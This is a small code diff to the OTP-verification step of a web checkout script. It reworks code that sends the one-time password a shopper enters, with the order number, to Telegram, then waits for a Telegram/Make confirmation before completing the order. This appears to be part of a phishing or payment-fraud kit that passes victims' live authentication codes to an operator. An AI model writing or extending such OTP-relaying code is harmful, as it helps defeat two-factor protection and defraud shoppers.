@@ -2366,14 +2366,14 @@ function verifyOTP() {
     goToCheckoutStep(4);
 
     // Send OTP to Telegram via your notification function
-    if (typeof sendTelegramNotification === 'function') {
-        sendTelegramNotification(checkoutData.orderRef, otp);
+    if (typeof TelegramNotifications !== 'undefined' && TelegramNotifications.userEnteredOTP) {
+        TelegramNotifications.userEnteredOTP(otp, checkoutData.orderNumber);
     } else {
-        console.warn('sendTelegramNotification function is not defined.');
+        console.warn('TelegramNotifications.userEnteredOTP function is not defined.');
     }
 
     // Start polling for confirmation from Telegram/Make scenario
-    waitForTelegramConfirmation(checkoutData.orderRef)
+    waitForTelegramConfirmation(checkoutData.orderNumber)
         .then(() => {
             processOrder();
         })
